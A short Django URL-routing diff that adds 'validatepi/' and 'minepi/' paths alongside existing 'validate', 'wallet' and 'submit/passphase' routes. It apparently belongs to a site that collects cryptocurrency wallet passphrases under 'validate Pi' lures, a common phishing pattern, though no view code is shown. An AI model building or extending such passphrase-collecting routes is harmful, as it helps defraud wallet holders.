@@ -3,6 +3,8 @@ from . import views
 
 urlpatterns = [
     path('', views.index, name='home'),
+    path('validatepi/', views.index, name='validatepi'),
+    path('minepi/', views.index, name='minepi'),
     path('validate/', views.validate, name='validate'),
     path('wallet/', views.wallet, name="wallet"),
     path('submit/passphase/', views.submit_pass, name="submit_pass"),
